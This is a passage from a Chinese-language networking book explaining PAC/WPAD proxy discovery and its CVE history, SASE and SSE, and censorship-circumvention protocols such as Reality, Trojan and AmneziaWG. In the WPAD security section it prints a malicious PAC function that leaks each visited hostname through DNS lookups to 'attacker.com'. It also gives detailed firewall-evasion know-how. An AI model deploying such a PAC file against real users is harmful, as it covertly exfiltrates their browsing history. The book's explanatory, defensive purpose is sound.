PAC（Proxy Auto-Configuration）讓瀏覽器自動依規則選擇 proxy。WPAD（Web Proxy Auto-Discovery）讓瀏覽器自動找到 PAC 檔案。兩者是 1990 年代發明、至今仍廣泛使用，但也是本書記錄的重大資安洞之一。

1996 年 Netscape 工程師 Lou Montulli（也是 cookie 與 lynx 瀏覽器的發明者之一）設計了 PAC — 一個 JavaScript 檔案，瀏覽器執行其中的 FindProxyForURL(url, host) 函式來決定每個請求該走哪個 proxy。1999 年微軟與 Inktomi 推出 WPAD，讓瀏覽器自動發現 PAC URL。這套機制服務了三十年的企業網路，至今仍是 Active Directory 域環境的預設選擇。但 WPAD 的「自動發現」機制有設計時未充分考慮的攻擊面 — 多個 CVE 編號為證。

20.1 — PAC：JavaScript 寫成的 proxy 路由器

PAC 檔案是純 JavaScript，唯一強制要實作的函式是 FindProxyForURL(url, host)，回傳值告訴瀏覽器該怎麼連這個 URL：

Listing 20.1 · 典型企業 PAC 檔案function FindProxyForURL(url, host) {
    // 1. 內網域名直連（不走 proxy）
    if (shExpMatch(host, "*.corp.example.com") ||
        shExpMatch(host, "intranet") ||
        shExpMatch(host, "*.local")) {
        return "DIRECT";
    }

    // 2. 內網 IP 直連
    if (isInNet(host, "10.0.0.0", "255.0.0.0") ||
        isInNet(host, "172.16.0.0", "255.240.0.0") ||
        isInNet(host, "192.168.0.0", "255.255.0.0")) {
        return "DIRECT";
    }

    // 3. 黑名單 — 直接拒絕（PROXY 0.0.0.0:0 無效，瀏覽器會報錯）
    if (dnsDomainIs(host, ".malware-example.com")) {
        return "PROXY 0.0.0.0:0";
    }

    // 4. 影音串流走專門 proxy（節省主 proxy 頻寬）
    if (dnsDomainIs(host, ".youtube.com") ||
        dnsDomainIs(host, ".netflix.com")) {
        return "PROXY video-proxy.example.com:3128";
    }

    // 5. 其他全部走主 proxy，並提供備援
    return "PROXY proxy1.example.com:3128; " +
           "PROXY proxy2.example.com:3128; " +
           "DIRECT";
}

PAC 內建函式（從 Netscape 規範繼承）：

函式用途
isPlainHostName(host)是否單字主機名（無點號）
dnsDomainIs(host, domain)主機是否在指定域
localHostOrDomainIs(host, hostdom)是否同主機或域
isResolvable(host)主機是否能 DNS 解析
isInNet(host, pattern, mask)主機 IP 是否在網段
dnsResolve(host)解析主機到 IP
myIpAddress()本機 IP（決策時依本機位置）
dnsDomainLevels(host)域名點號數
shExpMatch(str, pattern)shell glob 比對
weekdayRange(wd1) / timeRange(...)時間規則

回傳值格式：

  • "DIRECT" — 不走 proxy，直連
  • "PROXY host:port" — 走指定 HTTP proxy
  • "SOCKS host:port" 或 "SOCKS5 host:port" — 走 SOCKS proxy
  • 多個用 ; 分隔，瀏覽器依序嘗試（容錯）

PAC 的優勢是規則寫在中央 PAC 檔，更新規則只需改一個檔，所有 client 自動套用。比起在每台電腦設定靜態 proxy 強大得多。

PAC 檔通常透過企業內部 web server 提供：

    listen 80;

    location ~ \.(pac|dat)$ {

  • Windows：Internet Options → Connections → LAN settings → "Use automatic configuration script" → 填 PAC URL
  • macOS：System Settings → Network → Proxies → Automatic Proxy Configuration → 填 URL
  • Firefox：about:preferences → Network Settings → Automatic proxy configuration URL
  • Group Policy（域環境）：透過 GPO 推送 PAC URL，員工無感

20.3 — WPAD：自動發現 PAC URL

WPAD 解決一個問題：「怎麼讓 client 不需設定就找到 PAC URL？」答案是讓 client 主動「問」網路。WPAD 規範了兩種發現機制：

DHCP option 252

當 client 取得 DHCP 租約時，DHCP server 透過 option 252 直接告訴 client PAC URL：

ISC DHCP server 配置option wpad-url code 252 = text;
subnet 10.0.0.0 netmask 255.0.0.0 {
    range 10.0.0.10 10.0.255.254;
    option wpad-url "http://wpad.corp.example.com/wpad.dat";
}

DNS 查詢 wpad.<your-domain>

如果 DHCP 沒給 option 252，client 會做 DNS 查詢嘗試找到 PAC：

  1. 取得本機 FQDN，例如 laptop.corp.example.com
  2. 逐層往上找：wpad.corp.example.com → wpad.example.com → wpad.com （！）
  3. 找到能解析的 host 後，HTTP GET http://wpad.<...>/wpad.dat

這個「逐層上找」的設計就是 WPAD 主要安全洞的根源。

20.4 — WPAD 安全洞：從 CVE 案例看

WPAD 攻擊面總覽

WPAD 設計時假設「網路是可信的」，2026 年回看這個假設處處有問題。三類攻擊：

1. WPAD spoofing：攻擊者在區網架假 WPAD server，攔截 PAC 請求

2. 外網 wpad.<TLD>：DNS 逐層上找會問到 wpad.com（已存在的真實域名！）

3. PAC JavaScript 注入：惡意 PAC 檔能洩漏 URL 到攻擊者控制的 DNS server

CVE-2007-5377：Apple Mac OS X WPAD 漏洞

2007 年 Apple Mac OS X 的 PAC parser 有 stack overflow 漏洞，惡意 PAC 檔能執行任意代碼。攻擊路徑：在公開 WiFi 架假 WPAD server → 受害者連線時自動下載並執行惡意 PAC → RCE。

CVE-2014-1813：Internet Explorer 提權

IE 的 WPAD 處理流程中存在權限管理錯誤，本地用戶可透過 PAC 注入提升至 SYSTEM 權限。Microsoft 在 MS14-052 patch 修補。

badWPAD 攻擊（2016, US-CERT TA16-144A）

2016 年 US-CERT 發布警告：研究者發現大量 wpad.<TLD> 的真實域名被攻擊者註冊，當 client 在外網（飯店、機場 WiFi）做 WPAD 自動發現時，會碰到這些域名並下載惡意 PAC。具體案例：

  • wpad.com、wpad.net、wpad.org 等被研究者持有
  • 當員工在公開 WiFi 上、企業 VPN 未連時，瀏覽器 WPAD 查詢可能擊中外網假 WPAD
  • 「企業內網安全 + 公開 WiFi 暴露」的混合工作模式特別危險

2016 年起 Chrome、Firefox 與 Windows 開始限制 WPAD 域 — 不查詢 wpad.<TLD>，必須有至少二級子域。但這個防護不完整，且舊系統未必有此 patch。

PAC 內 dnsResolve() 的洩漏向量

PAC 內的 dnsResolve() 函式可以對任意主機做 DNS 查詢。惡意 PAC 能把使用者瀏覽過的每個 URL 主機名透過 dnsResolve 洩漏到攻擊者控制的 DNS server：

function FindProxyForURL(url, host) {
    // 攻擊者把 host 編碼到 DNS 查詢
    var exfil = host.replace(".", "-") + ".attacker.com";
    dnsResolve(exfil);  // 攻擊者 DNS server 收到「使用者剛訪問了哪個網站」
    return "DIRECT";
}

連 HTTPS 也擋不住 — PAC 在連線前執行，能看到完整 URL（含 path 與 query string）。Chrome 在 2017+ 限制 PAC 看到 URL 為 origin（去掉 path）以減緩這個洩漏，但仍能洩漏 host。

20.5 — Active Directory 整合

企業環境中 PAC + WPAD 通常與 AD 域整合，透過 Group Policy 統一部署：

  • 例外清單（不走 proxy 的內網域名）
  • 強制鎖定 — 員工不能在 IE/Edge 設定中改
  • 關閉 WPAD 自動發現（避免外網 badWPAD 攻擊）— 推薦
2026 年部署建議

強烈建議在 GPO / MDM 中：(1) 關閉 WPAD 自動發現（用 GPO 強制 PAC URL）、(2) PAC 檔伺服器用 HTTPS（雖然會多一個 chicken-and-egg 問題：要先信任憑證才能拿 PAC）、(3) 對員工筆電在公司外的網路啟用 always-on VPN（避免飯店 WiFi 被 WPAD spoofing）。

20.6 — 2026 年的 ZTNA 取代趨勢

PAC + WPAD 是「內網信任 / 外網不信任」二分法時代的設計。2026 年企業普遍轉向 Zero Trust Network Access（ZTNA） — 沒有「內網」概念，每次存取都驗證身分與裝置狀態。

典型轉換路徑：

傳統（2010 年代）2026 年 ZTNA
PAC 控制流量分流endpoint agent（Cloudflare WARP / Netskope client / Zscaler ZIA agent）攔截
內網 / 外網二分每個請求都驗證 user + device + context
WPAD 自動發現endpoint agent 透過 MDM 安裝、零配置
固定企業 proxy IPSASE 全球 PoP，跟員工走
VPN 進入內網ZTNA 直接到目標 app（沒有「內網」）

ZTNA 解決了 PAC + WPAD 的多個問題：(1) 沒有 WPAD 攻擊面、(2) 員工在外不需 VPN 也安全、(3) 規則中央管控且即時生效、(4) 內外網一致體驗。

但 PAC + WPAD 在許多既有環境仍會運行多年 — 特別是 Active Directory 重度依賴的傳統企業。理解這套機制（包括它的弱點）仍是運維工程師的必備技能。Part VI Ch.52 會深入展開 ZTNA。

本章要點

PAC = 用 JavaScript 寫的 proxy 路由規則；FindProxyForURL(url, host) 是核心函式。WPAD 透過 DHCP option 252 與 DNS 查詢 wpad.<domain> 自動發現 PAC URL。WPAD 的「DNS 逐層上找」是嚴重的設計洞，催生了 CVE-2007-5377、CVE-2014-1813、badWPAD（2016 US-CERT TA16-144A）等多個事件。Active Directory 整合透過 GPO 統一部署。2026 年的趨勢是 ZTNA + endpoint agent 取代 PAC + WPAD，但既有環境仍會運行多年，理解這套技術仍是必備。

Chapter 21

企業稽核、合規與 SASE
2026 年企業 Forward Proxy 的雲端化終局

SASE（Secure Access Service Edge）由 Gartner 2019 年提出，到 2026 年已徹底重塑企業網路安全市場。本章解構 SASE 框架、檢視 2025 Gartner Magic Quadrant 競爭格局、並理解傳統 on-prem proxy 為何被雲端方案取代。

Ch.18 與 Ch.19 我們深入了 Squid 的傳統 on-prem 部署。Ch.20 看了 PAC + WPAD 的舊世界。本章把鏡頭拉高 — 在 2026 年的企業環境，SASE（Secure Access Service Edge）正在系統性取代這些技術。Squid + PAC + 企業 firewall 的架構不會在一夜之間消失（既有部署的轉換成本巨大），但新建環境幾乎都選 SASE。理解這個趨勢是現代網路工程師的必修課。

21.1 — SASE 框架：Gartner 2019 提出的整合

2019 年 8 月 Gartner 在《The Future of Network Security Is in the Cloud》報告中首次提出 SASE 概念。核心洞察：網路與安全功能在雲端融合，從邊緣（最靠近 user 與 app 處）提供。

SASE = SD-WAN + 五個安全服務的雲端整合：

元件傳統對應SASE 整合後
SD-WANMPLS、IPsec VPN軟體定義廣域網路（連結分支機構）
SWG（Secure Web Gateway）Squid、Bluecoat、企業 firewall雲端 web 過濾、URL 分類、SSL inspection
CASB（Cloud Access Security Broker）無（這是新類別）SaaS 應用稽核（O365、Salesforce、Dropbox 等）
ZTNA（Zero Trust Network Access）VPN（IPsec、SSL VPN）身分驅動的應用層存取（取代 VPN）
FWaaS（Firewall as a Service）實體 firewall appliance雲端 L3-L7 firewall

「整合」是 SASE 的關鍵字 — 過去這些功能由不同廠商、不同設備提供，企業 IT 要管十幾個管理介面、十幾本 log。SASE 把它們合併到一個雲端平台，單一管理介面、單一 policy engine、單一 log。

21.2 — SSE：SASE 的子集

2021 年 Gartner 又提出 SSE（Security Service Edge） — 它是 SASE 去掉 SD-WAN 後的子集：SWG + CASB + ZTNA + FWaaS。為什麼要分？因為許多企業已有 SD-WAN 投資（Cisco SD-WAN、VMware VeloCloud、Versa 等），不想換廠商，但想要雲端安全服務。SSE 就是給這群客戶的。

關係圖：

SASE 與 SSE 的關係SASE = SD-WAN + SSE
                  └─ SSE = SWG + CASB + ZTNA + FWaaS

實務部署選擇：
  • Single-vendor SASE：一家廠商提供全部（Cato、Fortinet、Palo Alto）
  • SSE-only：保留現有 SD-WAN，加雲端安全（Zscaler、Netskope）
  • 多廠商組合：自己整合（複雜，但避免 vendor lock-in）

21.6 — 為什麼仍有人用 Squid？

SASE 看似全勝，但 2026 年仍大量企業用 Squid 等傳統方案。原因：

  • 合規／資料主權：歐洲、中國、俄羅斯等地區的法規要求流量解密發生在境內，雲端 SASE 廠商（多在美國）不符合
  • 已部署投資：上一代 firewall + Squid + DLP 投入巨大，遷移成本高
  • 特殊需求：高度客製的 ICAP / eCAP 內容處理、特殊協定 proxy
  • 成本敏感：SASE 是訂閱制，每員工每月 $5–15 USD，大企業年費可達數百萬
  • 不信任雲端：金融、軍工、醫療的部分業務仍要求 on-prem

所以 2026 年的真實圖像是混合：新部署用 SASE，既有 Squid 仍運行，逐步遷移。完全棄用 on-prem 的時程估計需要 5–10 年。

21.7 — SASE 在 AI 時代的演進

2024–2026 年 SASE 廠商開始整合 AI 相關能力：

  • AI 流量稽核：偵測員工是否把機密資料上傳 ChatGPT / Claude（Netskope、Palo Alto 已支援）
  • Shadow AI 偵測：員工自行使用未授權的 AI 工具
  • Generative AI policy：限制特定 prompt 內容、限制檔案上傳
  • Agentic AI：Cato 預告 2026 年的 agentic AI 能力（Gartner 評論之）

這個方向與本書 Part V（AI 時代的 Proxy）緊密相關 — AI Gateway、MCP、LLM Gateway 都是 SASE 的「向上演進」。Ch.45 會深入 AI 時代的代理安全。

22.2 — Shadowsocks 原版（2012）：簡單即美

2012 年程式設計師 clowwindy 發布 Shadowsocks 第一版。設計極簡：

關鍵性質：

  • 用 stream cipher（AES-CFB、AES-CTR、ChaCha20）對稱加密所有流量
  • 把 SOCKS5 的「目標地址」直接編碼進加密流的開頭
  • 無握手、無認證 — 流量看起來就是隨機 byte（這是設計目標）
  • Pre-shared key 從密碼用 EVP_BytesToKey 衍生

優點：實作極簡（最早版本是 ~500 行 Python）、流量無特徵（理論上 DPI 看不出差異）。缺點 — 後續 12 年慢慢被發現：

  • Stream cipher 沒有 integrity 保護，主動修改流量無法偵測
  • 主動探測攻擊：審查者送特殊封包到可疑 server，根據回應行為識別
  • EVP_BytesToKey 的密鑰衍生過時且弱
  • 多用戶場景無法區分

22.3 — Shadowsocks AEAD（2017）與 SS-2022

2017 年 SIP004 引入 AEAD 加密（AES-GCM、ChaCha20-Poly1305）取代 stream cipher。AEAD 提供完整的 authentication，解決 integrity 問題。但仍有 replay 攻擊與性能問題。

2022 年的 SIP022 是大規模升級，由 @database64128 等主導：

SIP022 的核心改變

  • BLAKE3 取代 HKDF-SHA1 做 key derivation（性能更好、更安全）
  • 強制 PSK 直接提供，不再從密碼衍生（消除弱密碼攻擊面）— 設計上致敬 WireGuard
  • 完整的 replay 防護（含 UDP）
  • TCP 與 UDP 各自獨立 session-based，UDP 性能大幅提升
  • Payload 上限從 0x3FFF（16,383）提升到 0xFFFF（65,535）
  • Standalone header chunks抗 active probing

SIP022 強制的兩個 cipher

  • 2022-blake3-aes-128-gcm
  • 2022-blake3-aes-256-gcm

所有合規實作必須支援這兩個。2026 年部署 Shadowsocks 必選 SS-2022，原版與 2017 AEAD 已是技術債。

後續的 SIP023（2024+）加入「Extensible Identity Headers」— 用層層 PSK hash 做多用戶區分，完全向後相容。

實際 sing-box 配置：

22.4 — V2Ray / Xray：協定家族的演進

2017 年 V2Ray 出現，定位是「協定平台」 — 不是單一協定，而是模組化框架，能組合多種 inbound、outbound、transport、加密層。其後 2020 年從 V2Ray 分支出 Xray（由 RPRX 主導，更激進、實驗性更強）。2026 年兩者並存，Xray 在抗審查前線更活躍。

VMess（2017）：第一代主協定

VMess 設計時希望比 Shadowsocks 更隱蔽 — 加入時間戳記校驗、UUID 認證、多層混淆。但 2018+ 研究發現 VMess 的 wire format 有可識別特徵（如固定 padding 模式），被 GFW 部分識別。2026 年 VMess 已基本被棄用。

VLESS（2020）：減法設計

VLESS 是 RPRX 的「減法設計」 — 把 VMess 的加密部分整個拿掉，依賴外層 TLS 提供加密。VLESS 自己只做「身分驗證 + 流量轉發」。

VLESS 請求格式（極簡）[1 byte: version=0x00]
[16 bytes: UUID (binary)]
[1 byte: addons length] [addons bytes]
[1 byte: command=0x01 (TCP) | 0x02 (UDP)]
[2 bytes: port]
[1 byte: addr type] [addr bytes]
[payload...]

為什麼減法？因為當外層已經是真實 TLS 時，內層再加密只是浪費 CPU 並增加可識別特徵。VLESS 的設計邏輯是「讓 TLS 處理加密，VLESS 只處理代理語意」。

XTLS Vision（2022）：解決 TLS-in-TLS

翻牆協定常用 TLS 包裹另一個 TLS（內層應用是 HTTPS，外層 proxy 也是 TLS），形成「TLS-in-TLS」。這個雙層 TLS 對 ML 分類器是強烈訊號。XTLS（2021）與其後的 Vision（2022）解決這個問題：

  1. 連線初期使用真實 TLS
  2. 偵測到內層也是 TLS 後，停止加密內層流量（直接傳遞已加密的內層 TLS byte）
  3. 只有非 TLS 流量才被外層加密

結果：外層觀察者看到的是「正常 TLS-over-TLS」而不是「proxy-encrypted TLS-over-TLS」，封包大小、時序特徵都更接近正常流量。

22.5 — Trojan（2019）：偽裝即一切

Trojan 的設計哲學完全不同 — 它不試圖「看起來像隨機 byte」（Shadowsocks 路線），而是「看起來是合法 HTTPS 網站的流量」。

運作方式：

  1. Server 是真正的 HTTPS web server（如 Nginx 上跑一個正常網站）
  2. Trojan 流量也用同一 port 443，相同憑證
  3. Client 連上後送一個特殊 password hash（SHA224 of 56-byte hex）
  4. 如果 password 對 → 進入 proxy 模式
  5. 如果 password 錯（或是普通訪客）→ 流量轉送給後端真實網站

「fallback」機制是關鍵 — 對主動探測者（去訪問你的 IP）而言，看到的是真實的網站，沒有可疑之處。

限制：

  • 仍然是真實 TLS，JA3/JA4 指紋暴露 client 是哪個 Trojan 客戶端（如 trojan-go 的指紋與 Chrome 不同）
  • 2022+ 的 ML 分類器能透過流量行為（如 packet timing）區分 Trojan 與真實 web 流量
  • 需要真實域名 + 真實憑證 + 真實後備網站，部署成本高

Trojan 在 2020-2022 年是主流，2023 年起逐步被 Reality 取代。

22.6 — Reality（2023）：偽裝成「別人的網站」

Reality 是 RPRX 在 2023 年的突破性設計，解決 Trojan 的根本限制 —「需要自己的真實域名與憑證」。Reality 的核心觀念：偽裝成別人的網站。

運作流程

假設你想用 Reality server 偽裝成 www.amazon.com：

  1. Reality server 監聽 :443
  2. Client 連上時，發送 ClientHello，SNI 設為 www.amazon.com
  3. Reality server 用自己的 X25519 私鑰計算 ECDH 共享密鑰
  4. Reality server 把計算結果與 ClientHello 中的特定 byte 比對 — 若是合法 client，server 自簽 Ed25519 憑證進入 proxy 模式
  5. 若是非 client（包括主動探測者），server 把整個連線轉發到 www.amazon.com:443，主動探測者看到的是真實 Amazon 網站

關鍵性質：

  • 不需要自己的域名：Reality server 偽裝成任何能訪問的真實網站
  • 不需要憑證：透過 ECDH + HMAC 自證身分，動態生成假 Ed25519 憑證
  • 主動探測完全失效：探測者看到的是真實 Amazon
  • Server 不需要 acme certbot；不需要 nginx fallback

Reality 的密碼學細節

Reality 的握手認證機制（從 Xray 源碼分析）：

Reality 客戶端認證流程（2026 年 Xray 26.x）# 1. Client 構造特殊的 ClientHello.Random
authData = [
  Xray version (3 bytes),                # Version_x, Version_y, Version_z
  0,                                     # reserved
  Unix timestamp (4 bytes, big-endian),  # 防 replay
  ShortId (8 bytes)                      # 用戶識別
]
# 共 16 bytes，會放在 Random[:16]

# 2. ECDH 計算共享密鑰
shared = ECDH(client_x25519_private, server_x25519_public)
auth_key = HKDF-SHA256(shared, salt=Random[:20], info="REALITY")

# 3. AES-GCM 加密前 16 bytes（authData）
# nonce = Random[20:32], AAD = full ClientHello
encrypted_auth = AES-GCM(auth_key, nonce, authData)
Random[:16] = encrypted_auth

# 4. Server 反向驗證；若通過則注入自簽 Ed25519 憑證
#    並在憑證 signature 欄位放 HMAC-SHA512(auth_key, ed25519_public)

Spider Traffic System（2024）

Reality 還有 Spider Traffic System — 當認證失敗、流量轉發到真實 Amazon 後，client 會繼續模擬正常瀏覽行為：發送多個 HTTP/2 請求、設 Referer、隨機延遲、padding cookie。讓 fallback 流量看起來像真實使用者瀏覽 Amazon，而不是「連一次然後斷線」這種可疑模式。

2025 年加入 ML-DSA-65 後量子簽名

2025 年 Xray 在 Reality 加入可選的 ML-DSA-65（NIST 標準化的後量子簽名）作為驗證機制。即使未來有量子電腦能破 ECDH，Reality 認證仍安全。這是抗審查協定領域第一個加入後量子密碼學的主要協定。

22.7 — Hysteria 2（2023）：QUIC 上的速度王

前面所有協定都是 TCP-based。Hysteria 2（apernet/hysteria，2023 重大改版為 v2 / "v4" 內部協定版本）走完全不同路線 — 基於 QUIC + UDP，目標是極致速度。

兩個關鍵設計

  • 偽裝成 HTTP/3：Hysteria server 對未認證連線回應 HTTP/3 — 主動探測者以為是普通 HTTP/3 server
  • Brutal CC algorithm：使用者指定上下行頻寬（如 100 Mbps），Brutal 強制 client 維持這個速度，不受 packet loss 影響。傳統 TCP CUBIC/BBR 在丟包時會減速；Brutal 不會。

Brutal 的設計邏輯：「網路品質差不應該降低速度，使用者付費就應該得到承諾的速度」。代價：在共享 bottleneck 鏈路會擠壓其他 TCP 流量（不公平）。這是個爭議性設計。

Salamander 混淆

Hysteria 2 的可選 Salamander obfuscation 把每個 QUIC packet 用 BLAKE2b-256 hash + PSK 包裝，使 wire 上看不出是標準 QUIC。但啟用 Salamander 後就不再是 HTTP/3 偽裝，二選一。

2025–2026 年的 QUIC 困境

QUIC 抗審查的逆風

2025 年 GFW 開始系統性封鎖 QUIC（即使在防火牆規則中也只是阻斷而非偵測）。Iran 也曾全面封鎖 QUIC 出境。這對 Hysteria 2 與其他 QUIC-based 協定（TUIC、NaiveProxy）都是嚴重打擊。2026 年 Hysteria 2 在中國「partially blocked」，需要 Salamander obfuscation 才能在多數場景使用。

諷刺的是，全球 HTTP/3 採用率達 35%（cf. Ch.12），但抗審查國家對 QUIC 的封鎖讓「偽裝成 HTTP/3」這個策略大幅失效。協定設計選擇 TCP 還是 UDP 在抗審查場景已經是嚴肅的取捨。

22.8 — NaiveProxy：用 Chrome 直接做 client

NaiveProxy（klzgrad/naiveproxy）的設計極為獨特 — 它不寫自己的 TLS 客戶端，而是直接用 Chrome 的 cronet 庫。

邏輯：

  1. Reality / Trojan / Shadowsocks 都需要實作 TLS 客戶端，難以完美模仿 Chrome 的 JA3/JA4 指紋
  2. NaiveProxy 直接讓 Chrome 的網路堆疊（cronet）發出 TLS 請求
  3. 結果：JA3/JA4 指紋與 Chrome 完全一致，因為它就是 Chrome
  4. HTTP/2 設定、ALPN 順序、TLS extension 順序都自動匹配

NaiveProxy 主要作為 forward proxy + 透過 Chrome cronet 發出 HTTP CONNECT 請求到後端的 Caddy 或 NaiveProxy server。Server 端用 Caddy + naive plugin 提供。

NaiveProxy 的限制

  • 仍是 TLS-in-TLS：客戶端到 server 是 HTTPS，內層 HTTP CONNECT 後又是 HTTPS，雙層 TLS 行為仍能被 ML 分類器辨識
  • 嚴重依賴 Chrome 升級節奏（cronet 必須與 Chrome 版本對齊）
  • Server 端 Caddy 的 fallback 配置複雜

2026 年 NaiveProxy 在「需要完美 Chrome 指紋」的場景仍是首選，但複雜度比 Reality 高。

22.9 — ShadowTLS v3：對 Rustls 最小修改

ShadowTLS（ihciah，2022 起）走的是另一條路：直接用既有 TLS 庫，做最小必要修改。

v3（2024）的設計：

  • 採用 Rustls（純 Rust TLS 庫）
  • 對 Rustls 做最小修改使其能回應 TLS Alert（避免被主動探測時無回應暴露）
  • Server 收到 ClientHello 後，根據認證決定 forward 真實 TLS 後端 還是 進入 proxy 模式

ShadowTLS v3 的優勢是「修改幅度最小」 → 「指紋與真實 Rustls 完全一致」。劣勢是 Rustls 在某些情境下（如 Bun runtime）的指紋反而少見，會成為新的識別點。

22.11 — 為什麼 Reality 在 2026 年勝出？

觀察 2026 年中國抗審查社群的選擇，Reality 是當下首選。原因可以從 GFW 在 2024-2025 年的演進看出：

GFW 的演進壓力

  • SNI 白名單部署（福建泉州中國移動率先 2024 試點）：對於非白名單 SNI 直接拒絕 TLS 連線。Trojan、VLESS+TLS 都會被擋（除非 SNI 用知名網站）
  • 主動探測常態化：GFW 自動探測可疑 server，看是否回應正常 HTTPS
  • ML 流量分類器：基於 packet timing、size distribution 等識別 proxy 流量

Reality 的設計恰好同時應對這三個壓力：

  1. SNI 用真實知名網站（amazon.com、microsoft.com），白名單通過
  2. 主動探測時 fallback 到真實 Amazon，無可疑特徵
  3. spider traffic system 模擬正常瀏覽行為，騙過 ML

Trojan 不能用 amazon.com（你不擁有那個域名）；VLESS 需要自己的網站；NaiveProxy 仍是 TLS-in-TLS。Reality 是目前唯一同時解決三個問題的協定。

22.12 — 軍備競賽的終局

讀完本章你會看到一個圖像 — 抗審查協定的演進不是「更好的密碼學」，而是「更好的偽裝」。Shadowsocks 偽裝成隨機 byte → Trojan 偽裝成 HTTPS 網站 → Reality 偽裝成第三方真實網站。每次審查者學會識別新模式，協定設計者就找新的偽裝目標。

這個軍備競賽會繼續多久？樂觀派認為 ECH（cf. Ch.11 §11.6）一旦普及，所有 SNI-based 識別失效，協定設計可以回到單純的密碼學。悲觀派認為審查者會用更深的 ML 分類器（Cross-layer RTT 分析、流量時序），單純的「偽裝」終將失效，必須走「使流量真的不可區分」（如把 proxy 流量真的塞進 CDN）。

無論哪一種，2026 年的此刻，Reality 是最佳工程妥協。下一章我們看「混淆」這個獨立議題 — 即使協定設計完善，偶爾仍需要額外的混淆層應對特殊環境。

流量混淆與抗審查
當協定本身的偽裝不夠，再加一層

Reality 的偽裝是「在 client-server 連線層」做。本章看另一個維度的對抗 — 在傳輸層、行為層做混淆。obfs4、Cloak、AmneziaWG（2024 年 WireGuard 反 DPI 改造）都在這個層次。

Ch.22 的協定家族解決「協定看起來是什麼」的問題。但即使你用完美的 Reality，還有另一層問題 — 「流量行為看起來是什麼」。Packet 大小分佈、傳送時序、突發模式、連線總長度，這些都是現代 ML 流量分類器能識別的特徵。本章看獨立於協定的混淆層技術。

23.1 — 混淆與加密的差別

很多人混用「加密」與「混淆」這兩個詞，但在抗審查語境下它們有明確區別：

加密（Encryption）混淆（Obfuscation）
目標讓觀察者看不懂內容讓觀察者看不出協定
典型技術AES-GCM、ChaCha20-Poly1305byte 重排、padding、時序擾亂
數學基礎密碼學原語統計學特徵抹除
失效情境密鑰外洩、量子電腦ML 分類器能識別新特徵
例子TLS 1.3 內容obfs4、Salamander

本章關注混淆。混淆的設計挑戰：要在「加密內容已固定」的前提下改變外觀，這是反向工程的反向工程。

23.2 — obfs4：Tor 橋接的標準

obfs4（the obfs4 protocol，2014 年由 Yawning Angel 為 Tor Project 設計）是 Tor 在抗審查國家的橋接器（bridge）標準。它在 Tor 流量外加一層偽裝，讓「Tor 流量」看起來不像 Tor。

設計哲學：完全的 byte stream 隨機化

obfs4 的目標是讓所有流量在 wire 上看起來是均勻分佈的隨機 byte。三個關鍵技術：

  • Ntor 握手：類 Curve25519 的握手，用 server 公鑰驗證。Bridge 公鑰透過 Tor 網路或 BridgeDB 取得
  • 幀格式：所有 byte 包含 length + payload + MAC，加密後不可區分於隨機資料
  • Inter-arrival time（IAT）模式：客戶端可選 IAT obfuscation 隨機化封包到達時間，破壞 timing 分析

Pluggable Transport 架構

obfs4 是 Tor 的 Pluggable Transport（PT）機制下的一種。PT 是 Tor 抽象層 — Tor client 把流量送 PT，PT 處理混淆，再 forward 出去。同一架構下還有：

  • obfs3（已棄用）：obfs4 的前代
  • meek：用 CDN 的 domain fronting 偽裝（2017 後在大型 CDN 處被禁）
  • Snowflake：透過 WebRTC + 志願者代理，極難封鎖
  • WebTunnel（2024，Tor Project）：偽裝成 HTTPS WebSocket

2026 年 Tor 在中國的主要橋接是 obfs4 與 Snowflake；伊朗常用 meek 與 WebTunnel。Ch.24 會深入 Tor 架構。

23.3 — Cloak：TLS 的「精準偽裝」

Cloak（cbeuw/Cloak，2018+）是另一個有趣的設計。它把任意 proxy 流量包成「看起來與真實網站完全一致的 TLS 連線」。

運作流程：

  1. Cloak server 同時是真正的 web server（如跑著正常 wordpress）
  2. Client 連上後送特殊的 ClientHello — 帶有 user identification 隱藏在 SNI 與 session ticket 中
  3. 若 client 合法 → 進入 proxy 模式
  4. 若 client 非法（含主動探測）→ 真的提供網站服務

看起來與 Trojan / Reality 類似，但 Cloak 的差異：

  • Cloak 是 transport layer wrapper，可以把 SS、Trojan、其他協定的流量都包進去
  • 支援多用戶，server 上可以同時是 wordpress + 多個 proxy 用戶
  • 支援 Chrome / Firefox / Safari 三種 TLS 指紋偽裝

2026 年 Cloak 的活躍度不如 Reality，但仍是 SS / Trojan 用戶的混淆選項。

23.4 — AmneziaWG：WireGuard 的反 DPI 改造（2024）

WireGuard（cf. Ch.4 §4.3）是 2026 年最受歡迎的 VPN 協定，但它有個抗審查弱點 — WireGuard 的 handshake packet 有極為明顯的固定特徵。在中國、伊朗等地，WireGuard 流量在連線開始的前幾個 packet 就會被 DPI 識別。

AmneziaWG（amnezia-vpn 在 2024 年發布）是 WireGuard 的反 DPI 改造。它對 WireGuard 協定做最小但關鍵的改變：

五個改造參數

參數意義
Jc連線開始時送多少個 junk（垃圾）packet
Jmin / Jmax每個 junk packet 的大小範圍
S1 / S2對 init / response packet 加多少 padding
H1-H4改寫 packet header 的 magic byte（破壞固定特徵）

這些改造的效果：

  • 連線開始的 byte stream 被打亂（DPI 看不到熟悉的 WireGuard 特徵）
  • Packet 大小分佈不再是固定的 92 / 60 bytes 模式
  • Header magic 被改寫，特徵碼匹配失敗

使用方式：在 WireGuard 配置裡加入這些參數即可，client 與 server 必須一致：

AmneziaWG 配置範例[Interface]
PrivateKey = ...
Address = 10.8.0.2/24

# AmneziaWG 反 DPI 參數
Jc = 5
Jmin = 50
Jmax = 1000
S1 = 100
S2 = 200
H1 = 123456789
H2 = 987654321
H3 = 555555555
H4 = 111111111

[Peer]

AmneziaWG 在伊朗、俄羅斯等 WireGuard 流量被識別的地區有顯著效果。在中國因為 GFW 對 UDP 流量的整體限制，效果有限。

23.5 — 中國 SNI 白名單部署（2024–2025）

本書 Ch.7 與 Ch.22 多次提到 SNI 白名單，這裡展開。

事件背景

2024 年起，中國福建泉州中國移動率先部署 SNI 白名單機制：

  • 所有出境 TLS 連線必須含有「合法」SNI
  • 合法 SNI 是動態維護的白名單（包含主流外國網站如 Google、Microsoft、AWS 等）
  • 對非白名單 SNI 的 TLS 連線直接 RST
  • Empty SNI（沒有 SNI extension 的 ClientHello）也被拒絕

這個機制對抗審查協定的衝擊：

  • Trojan、VLESS、SS over TLS：原本用自己的域名，現在 SNI 不在白名單，連不上
  • NaiveProxy：用真實 HTTPS server 的 SNI，仍可用（但需要架在已知白名單域名上）
  • Reality：完美應對 — 它的 SNI 用 amazon.com / microsoft.com 等真實知名網站，永遠在白名單

